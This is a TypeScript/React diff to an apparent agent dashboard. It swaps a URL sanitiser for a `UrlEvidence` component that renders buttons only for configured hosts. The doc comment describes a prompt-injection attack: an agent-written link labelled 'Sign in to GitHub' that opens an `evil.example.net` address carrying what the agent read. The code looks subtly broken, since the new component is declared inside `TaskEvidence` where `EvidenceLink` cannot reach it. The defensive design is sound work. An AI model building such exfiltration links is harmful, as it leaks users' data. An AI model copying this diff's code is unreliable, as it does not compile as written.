@@ -39,8 +39,8 @@ import {
   RefusalStrip,
   Stack,
   Stepper,
+  InlineRef,
   Text,
-  safeHref,
   peekClickHandler,
   type StepperStep,
 } from "@crewlethq/ui";
@@ -49,11 +49,14 @@ import {
   ChevronLeftGlyph,
   CircleCheckGlyph,
   FileTextGlyph,
-  LinkGlyph,
+  GlobeGlyph,
   SquareKanbanGlyph,
   SquareTerminalGlyph,
 } from "@crewlethq/icons/glyphs";
+import { VendorMark } from "@crewlethq/icons";
 import { href } from "~/app/router.tsx";
+import { describeLink } from "~/lib/inlineTokens.ts";
+import { useLinkHosts } from "~/lib/linkHosts.ts";
 import { peekHref, usePeekControls } from "~/app/frame/peekAddress.ts";
 import { RefusalNote, WriteButton, pressable } from "~/components/WriteButton.tsx";
 import { holdLine, ReassignItem } from "~/components/DecisionRow.tsx";
@@ -584,17 +587,8 @@ function EvidenceLink({ evidence }: { evidence: WorkDecisionEvidence }) {
           {evidence.label || "Coding run"}
         </ButtonLink>
       );
-    case "url": {
-      // A LINK THE ASKER WROTE is followed only through `safeHref`, and one it
-      // refuses is shown as words rather than dropped.
-      const url = safeHref(evidence.ref);
-      if (!url) return <Text variant="caption">{evidence.label || evidence.ref}</Text>;
-      return (
-        <ButtonLink {...look} href={url} external leadingIcon={<LinkGlyph size="sm" />}>
-          {evidence.label || new URL(url, location.href).host}
-        </ButtonLink>
-      );
-    }
+    case "url":
+      return <UrlEvidence raw={evidence.ref} />;
   }
   return null;
 }
@@ -607,6 +601,49 @@ function TaskEvidence({ id, label }: { id: string; label?: string }) {
   const read = useQuery("work_item", { id });
   const task = read.data?.task;
   const peek = usePeekControls();
+/**
+ * An address the asker cited, by the Inbox's `checked` rule
+ * (`LinkMode` in `lib/inlineTokens.ts`): a button only when the dashboard
+ * builds it, on a host the company configured and rebuilt from what it names
+ * ([LinkDescription.canonical]), labelled by the dashboard (the reference it
+ * is, or its host and path) and marked with its app's mark.
+ *
+ * NEVER THE ASKER'S LABEL AND NEVER ITS ADDRESS AS WRITTEN: both are an
+ * agent's words, and a button reading "Sign in to GitHub" that opens
+ * `https://evil.example.net/?q=<what it read>` is the one press an injected
+ * instruction needs. Any other address is drawn inert, as written, with its
+ * mark, so the reader sees and can copy where it would go.
+ */
+function UrlEvidence({ raw }: { raw: string }) {
+  const hosts = useLinkHosts();
+  const said = describeLink(raw, hosts);
+  const mark = said?.vendor ? (
+    <VendorMark vendor={said.vendor} size="sm" data-vendor={said.vendor} />
+  ) : (
+    <GlobeGlyph size="sm" />
+  );
+  if (said?.canonical) {
+    return (
+      <ButtonLink
+        variant="secondary"
+        size="small"
+        href={said.canonical}
+        external
+        leadingIcon={mark}
+      >
+        {said.label}
+      </ButtonLink>
+    );
+  }
+  return (
+    <Text variant="caption">
+      <InlineRef mark={mark} title={raw}>
+        {raw}
+      </InlineRef>
+    </Text>
+  );
+}
+
   const ref = { kind: "item" as const, id: read.data ? itemAddress(detailItem(read.data)) : id };
   return (
     <ButtonLink
